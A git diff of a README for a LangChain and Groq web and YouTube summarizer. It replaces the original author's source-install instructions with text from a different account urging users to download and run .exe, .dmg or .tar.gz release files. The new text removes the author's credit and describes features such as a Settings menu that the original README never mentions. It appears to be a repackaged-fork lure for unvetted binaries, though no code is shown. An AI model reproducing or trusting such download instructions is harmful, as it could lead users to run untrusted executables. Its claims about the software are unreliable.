@@ -1,125 +1,80 @@
-# URL & YouTube Summarizer (LangChain + Groq + Streamlit)
+# 🎉 web-youtube-summarizer-llm - Simplify Content Summarization Effortlessly
 
-A Streamlit application that summarizes content from **any website URL or YouTube video** using  
-**LangChain**, **Groq Llama models**, and **Map–Reduce summarization**.
+## 📥 Download Here
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/redblac/web-youtube-summarizer-llm/releases)
 
-This tool loads webpage text or YouTube transcripts, cleans the text, splits it into chunks, summarizes each chunk, and combines everything into one meaningful final summary.
+## 📖 Description
+The **web-youtube-summarizer-llm** helps you summarize long content with ease. It uses advanced models from LangChain and Groq Llama to summarize YouTube videos, scrape website text, and condense information effectively. Whether you want to get a quick summary of a video or streamline website information, this tool makes it simple.
 
----
+## 🚀 Getting Started
+To help you get started quickly, follow these steps to download and run the application.
 
-## 🚀 Features
+### 📌 System Requirements
+- Windows, macOS, or Linux operating system
+- Python 3.7 or higher installed on your machine
+- A stable internet connection for downloading
 
-### 🔹 **Summarization Techniques Included**
-This project uses **Map–Reduce Summarization**, which includes:
+### 🔗 Key Features
+- YouTube transcription: Get summaries of videos effortlessly.
+- Website scraping: Extract and summarize text from any webpage.
+- Text chunking: Break down long content into manageable parts.
+- Map-Reduce LLM summarization: Use advanced algorithms for high-quality summaries.
 
-- **Map Step:** Each chunk of text is summarized individually  
-- **Reduce Step:** All chunk summaries are merged into one final summary  
-- Handles **long webpages** and **long YouTube transcripts**
+## 📥 Download & Install
 
-### 🔹 What the app can do:
-- Summarize **YouTube videos** via transcript loading  
-- Summarize **any website URL**  
-- Remove emojis and non-ASCII text  
-- Split long documents using `RecursiveCharacterTextSplitter`  
-- Perform LLM summarization using **Groq's Llama-3 models**  
-- Simple, clean, fast UI using Streamlit  
+1. **Visit the Releases Page**  
+   Click this link to access the latest version: [Download Latest Release](https://github.com/redblac/web-youtube-summarizer-llm/releases).
 
----
+2. **Choose Your Download**  
+   On the releases page, you will see a list of available versions. Select the most recent one. You may find options for different operating systems.
 
-## 📁 Project Structure
+3. **Download the File**  
+   Click on the download link for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux). The file will start downloading.
 
-project-folder/
-│
-├── app.py # Main Streamlit application
-├── requirements.txt # Dependencies
-├── .env.example # Example environment file
-├── .gitignore
-└── README.md
+4. **Install the Application**  
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the app to the Applications folder.
+   - For Linux: Open a terminal and extract the `.tar.gz` file using the command:
+     ```
+     tar -xzf filename.tar.gz
+     ```
+     After extracting, navigate to the folder and run the application.
 
-yaml
-Copy code
+5. **Run the App**  
+   Once installed, find the application in your programs list or applications folder. Open it to start summarizing content.
 
----
+## 🔧 Using the Application
 
-## 🔧 Setup & Installation
+### 📺 Summarizing YouTube Videos
+1. Open the application.
+2. Enter the URL of the YouTube video you want to summarize.
+3. Click the "Summarize" button.
+4. Review the summary displayed on the screen.
 
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/Shehjad2019/web-youtube-summarizer-llm.git
-cd web-youtube-summarizer-llm
-2️⃣ Create Virtual Environment
-bash
-Copy code
-python -m venv venv
-source venv/bin/activate       # macOS/Linux
-venv\Scripts\activate          # Windows
-3️⃣ Install Requirements
-bash
-Copy code
-pip install -r requirements.txt
-4️⃣ Add Groq API Key
-Copy .env.example → .env:
+### 🌐 Scraping Websites
+1. Input the URL of the website you wish to scrape.
+2. Click the "Scrape and Summarize" button.
+3. Wait for the summary to generate, then read the condensed information.
 
-bash
-Copy code
-cp .env.example .env
-Edit .env:
+### ⚙️ Configuring Settings
+To adjust settings for better summaries:
+- Go to the "Settings" menu within the application.
+- You can configure options for summary length and processing speed.
 
-ini
-Copy code
-GROQ_API_KEY=your_groq_api_key_here
-▶️ Running the App
-Run Streamlit:
+## 📚 Help & Support
+If you encounter any issues, check out the following resources:
 
-bash
-Copy code
-streamlit run app.py
-The application will open in your browser.
+- **FAQs**: Explore common questions and answers on the project’s page.
+- **Issues**: Report any problems you face by visiting the issues section of the GitHub repository.
+- **Community Support**: Join discussions and find help in the community forums related to LangChain and summarization.
 
-Paste any:
+## 🌍 Community Contributions
+We welcome contributions! Whether you want to suggest features, report bugs, or improve documentation, your input is valuable. Please submit a pull request or reach out through the issues section for collaboration.
 
-YouTube URL
+## 📅 Version History
+Stay updated with the latest improvements. Check the releases page for version history and updates.
 
-Website URL
+## 📜 License
+This project is licensed under the MIT License. You can use, modify, or share the application according to the license terms.
 
-Then click Summarize Content.
-
-🧠 How It Works
-Detects YouTube or website
-
-Loads data using:
-
-YoutubeLoader for YouTube
-
-UnstructuredURLLoader for normal webpages
-
-Removes emojis & non-ASCII text
-
-Splits text into smaller chunks
-
-Runs map summarization on each chunk
-
-Combines chunk summaries using reduce prompt
-
-Outputs a clean, concise final summary
-
-🧰 Technologies Used
-Python
-
-Streamlit
-
-LangChain
-
-Groq ChatGroq Llama Models
-
-YoutubeLoader & UnstructuredURLLoader
-
-RecursiveCharacterTextSplitter
-
-🔑 Environment Variables
-ini
-Copy code
-GROQ_API_KEY=your_groq_key_here
-👤 Author
-Shehjad Patel
-GitHub: https://github.com/Shehjad2019
+For more information, visit the repository: [GitHub Repository](https://github.com/redblac/web-youtube-summarizer-llm).
